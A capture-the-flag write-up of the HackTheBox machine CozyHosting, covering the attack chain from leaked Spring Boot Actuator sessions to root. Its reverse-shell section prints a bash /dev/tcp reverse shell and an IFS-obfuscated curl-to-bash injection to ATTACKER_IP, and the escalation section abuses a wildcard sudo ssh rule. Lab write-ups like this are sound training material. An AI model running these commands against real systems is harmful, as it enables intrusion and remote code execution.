# CozyHosting — HackTheBox Machine Writeup

## 📌 Overview

- Platform: HackTheBox
- Target: CozyHosting Machine
- OS: Linux
- Difficulty: Easy
- Attack Path: Web Enumeration → Session Hijacking → Command Injection → Credential Extraction → SSH Access → Sudo Misconfiguration

---

## 🔍 Enumeration

### Nmap Scan

Initial port scan revealed:

- 22/tcp — SSH
- 80/tcp — HTTP

With only web and SSH exposed, the HTTP service became the primary attack surface.

---

## 🌐 Web Enumeration

### Virtual Host Discovery

The website referenced the domain:

cozyhosting.htb

Added to `/etc/hosts`:

10.10.X.X cozyhosting.htb

This indicated hostname-based virtual hosting.

---

### Directory Fuzzing

Directory enumeration revealed:

/error

Accessing this endpoint displayed a Whitelabel Error Page, which is a strong indicator of a Spring Boot application.

---

## 🧪 Spring Boot Actuator Enumeration

Further enumeration identified exposed Actuator endpoints:

/actuator  
/actuator/sessions

---

## Session Leakage

The `/actuator/sessions` endpoint exposed active session data including an admin user:

kanderson

This confirmed that session information was publicly accessible.

---

## Session Hijacking

By replacing the existing `JSESSIONID` cookie with the leaked session ID, administrative access to the web panel was obtained.

---

## ⚔️ Initial Foothold — Command Injection

An endpoint `/executessh` allowed execution of SSH commands.

Intercepted request:

POST /executessh  
host=localhost&username=test

The `username` parameter was vulnerable to command injection.

---

### Injection Testing

Special characters such as:

; | &&

were successfully executed.

This suggested the backend was running a command similar to:

ssh username@host

---

### Space Filter Bypass

Since spaces were filtered, the `${IFS}` variable was used to bypass the restriction.

IFS (Internal Field Separator) acts as whitespace in bash.

---

## Reverse Shell Execution

To obtain a stable shell, a staged payload approach was used.

### Step 1 — Create Reverse Shell Script

bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

Saved as `sets.sh`.

---

### Step 2 — Host Payload

python3 -m http.server 8000

---

### Step 3 — Execute Injection

test;curl${IFS}ATTACKER_IP:8000/sets.sh|bash;

A reverse shell was successfully obtained.

---

## 🔎 Post-Exploitation Enumeration

### Searching for Credentials

A Spring Boot JAR file was discovered and extracted:

unzip app.jar

The extracted configuration files contained database credentials.

---

## Database Access

Connected to PostgreSQL:

psql -h localhost -U postgres

Credentials for user `josh` were recovered.

---

## SSH Access

Using the recovered credentials:

ssh josh@cozyhosting.htb

Access to the system was obtained.

---

## 🚀 Privilege Escalation

### Sudo Enumeration

Running:

sudo -l

Revealed:

(root) /usr/bin/ssh *

This indicated a dangerous wildcard sudo rule.

---

## Root Exploitation

Abusing SSH options allowed execution of a root shell:

sudo /usr/bin/ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/bash josh@127.0.0.1

This resulted in a root shell.

---

## 🎯 Lessons Learned

- Exposed Spring Boot Actuator endpoints can leak sensitive session data
- Session hijacking can bypass authentication entirely
- Input filtering can often be bypassed using environment variables like IFS
- Credentials stored in application files are common privilege escalation paths
- Wildcard sudo rules are extremely dangerous

---

## 🧠 Tools Used

- Nmap
- Gobuster
- Burp Suite
- Netcat
- PostgreSQL client
